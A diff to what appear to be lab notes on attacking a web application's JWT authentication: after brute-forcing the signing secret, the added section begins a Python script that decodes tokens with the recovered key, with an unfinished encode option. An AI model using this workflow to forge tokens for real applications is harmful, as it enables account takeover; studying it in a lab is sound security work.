@@ -203,3 +203,25 @@ Run the newly created script with Python.
 Pass to it as an input the value of the auth token generated when the user is logged in to the web application founded in Storage in Inspect Element.
 
 After a few seconds, the script brute-forces successfully the secret used to sign the token.
+![[Pasted image 20250813232111.png]]
+# Creating script to decode the JWT
+
+Using the secret key found, an attacker can now decode the token and examine its content. To do so, create amd open a new file named jwt_decoder.py.
+`nano jwt_decoder.py
+```python
+import jwt
+import json
+def menu():
+    print('1. Decode JWT')
+    print('2. Encode JWT')
+    algorithm = "HS256"
+    secret = "banana!"
+    choice = int(input('\nEnter your choice: '))
+    if choice == 1:
+        jwt_token = input('\nEnter the JWT Token: ')
+        decoded_token = jwt.decode(jwt_token, secret, algorithms=[algorithm])
+        decoded_token = json.dumps(decoded_token)
+        print(decoded_token)
+    
+```
+
